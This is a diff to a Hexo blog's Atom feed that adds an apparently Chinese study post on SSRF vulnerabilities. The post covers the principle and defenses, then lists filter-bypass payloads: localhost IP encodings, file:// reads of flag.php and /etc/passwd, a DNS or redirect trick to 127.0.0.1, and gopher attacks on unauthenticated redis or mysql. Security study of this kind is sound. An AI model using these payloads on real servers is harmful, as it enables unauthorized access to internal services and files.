@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2024-12-08T10:16:17.769Z</updated>
+  <updated>2024-12-08T13:49:03.358Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>SSRF漏洞</title>
+    <link href="http://example.com/2024/12/08/SSRF%E6%BC%8F%E6%B4%9E/"/>
+    <id>http://example.com/2024/12/08/SSRF%E6%BC%8F%E6%B4%9E/</id>
+    <published>2024-12-08T10:42:29.000Z</published>
+    <updated>2024-12-08T13:49:03.358Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>SSRF (Server-Side Request Forgery: 服务器端请求伪造) 一种由攻击者构造形成由服务端发起请求的一个安全漏洞；</p><p>一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p><h1 id="协议利用"><a href="#协议利用" class="headerlink" title="协议利用"></a>协议利用</h1><figure class="highlight dts"><table><tr><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//  Web常见访问，如http://127.0.0.1</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">file:</span><span class="hljs-comment">// 从文件系统中获取文件内容，如，file://etc/passwd</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">dict:</span><span class="hljs-comment">// 字典服务器协议，访问字典资源，如，dict://ip:6739/info：</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">sftp:</span><span class="hljs-comment">// SSH文件传输协议或安全文件传输协议</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">ldap:</span><span class="hljs-comment">// 轻量级目录访问协议</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">tftp:</span><span class="hljs-comment">// 简单文件传输协议</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">gopher:</span><span class="hljs-comment">// 分布式文档传递服务，可使用gopherus生成payload。由于有部分协议http这类不支持，可以gopher来进行通讯（mysql，redis等）</span><br></code></pre></td></tr></table></figure><h1 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h1><ul><li>过滤返回信息，验证远程服务器对请求的响应。</li><li>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</li><li>限制请求的端口为 http 常用的端口，比如，80,443,8080,8090。</li><li>黑名单内网 ip。避免应用被用来获取获取内网数据，攻击内网。</li><li>禁用不需要的协议。仅仅允许 http 和 https 请求。可以防止类似于 file:&#x2F;&#x2F;, gopher:&#x2F;&#x2F;, ftp:&#x2F;&#x2F; 等引起的问题。</li></ul><h1 id="白盒绕过"><a href="#白盒绕过" class="headerlink" title="白盒绕过"></a>白盒绕过</h1><ol><li>无过滤直接获取<br><img src="/../images/Pasted%20image%2020241208210216.png"></li></ol><p>payload：</p><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">url=http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/flag.php<br>url=file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>flag.php<br></code></pre></td></tr></table></figure><ol start="2"><li>IP地址进制绕过</li></ol><p>正则过滤规则 &#x2F;localhost|127.0.|。&#x2F;i</p><p>payload:</p><figure class="highlight qml"><table><tr><td class="code"><pre><code class="hljs qml">十六进制<br>    <span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//0x7F.0.0.1/flag.php</span><br>八进制<br>    <span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//0177.0.0.1/flag.php</span><br><span class="hljs-number">10</span> 进制整数格式<br>    <span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//2130706433/flag.php</span><br><span class="hljs-number">16</span> 进制整数格式，还是上面那个网站转换记得前缀<span class="hljs-number">0</span>x<br>    <span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//0x7F000001/flag.php</span><br>还有一种特殊的省略模式<br>    <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>写成<span class="hljs-number">127.1</span><br>用CIDR绕过localhost<br>    <span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//127.127.127.127/flag.php</span><br>还有很多方式<br>    <span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//0/flag.php</span><br>    <span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//0.0.0.0/flag.php</span><br></code></pre></td></tr></table></figure><ol start="3"><li>域名解析IP绕过</li></ol><p>将自己拥有的域名添加一个记录解析为127.0.0.1。</p><p>如：test.xxx.com -&gt; 127.0.0.1</p><p>payload:</p><figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">url</span>=http://test.xxx.com/flag.php<br></code></pre></td></tr></table></figure><ol start="4"><li>利用重定向解析绕过</li></ol><p>在自己服务器上写一个跳转页面代码如下:</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location:http://127.0.0.1/flag.php&quot;</span>);<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">url</span>=http://服务器ip/xx.php<br></code></pre></td></tr></table></figure><ol start="5"><li>匹配且不影响写法解析</li></ol><p>正则匹配规则 (url 中必须包含) &#x2F;http://ctf.. * show$&#x2F;i</p><p>payload:</p><figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">url</span>=http://ctf.@<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/flag.php<span class="hljs-comment">#show</span><br></code></pre></td></tr></table></figure><ol start="6"><li>利用gopher协议打服务</li></ol><p>有一些前提条件，比如redis未授权、mysql无密码等。<br><img src="/../images/Pasted%20image%2020241208212140.png"></p><p><img src="/../images/Pasted%20image%2020241208212714.png"></p><p>利用工具：<a href="https://github.com/tarunkant/Gopherus" title="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p><p><img src="/../images/Pasted%20image%2020241208213030.png"></p><p>注意工具生成的url,要进行一次url编码，因为服务器会自动解一次码。</p><p>执行payload后就生成了x.php。<br><img src="/../images/Pasted%20image%2020241208213141.png"></p><h1 id="无回显的解决办法"><a href="#无回显的解决办法" class="headerlink" title="无回显的解决办法"></a>无回显的解决办法</h1><ol><li>dnslog 外带</li></ol><p><a href="https://blog.csdn.net/weixin_39190897/article/details/117197126">浅析DNSlog在渗透测试中的实战技巧_xml +dnslog-CSDN博客</a></p><ol start="2"><li>反向连接</li></ol><p><img src="/../images/Pasted%20image%2020241208214638.png"></p><p><img src="/../images/Pasted%20image%2020241208214645.png"></p><p><img src="/../images/Pasted%20image%2020241208214655.png"></p><ol start="3"><li>正向连接</li></ol><p>一般RCE执行可以用这个方式，SSRF得用第一种方式，因为SSRF无法写文件。</p><p>写个文件在对方网站目录下，然后再去访问网站目录是否存在这个文件就能判断目标是否执行了RCE命令。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h1&gt;&lt;p&gt;SSRF (Server-Side Request Forgery: 服务器端请求伪造) 一种由攻击者构造形成由服务端发起请求的一个安全漏洞</summary>
+      
+    
+    
+    
+    
+    <category term="WEB" scheme="http://example.com/tags/WEB/"/>
+    
+  </entry>
   
   <entry>
     <title>CSRF漏洞</title>
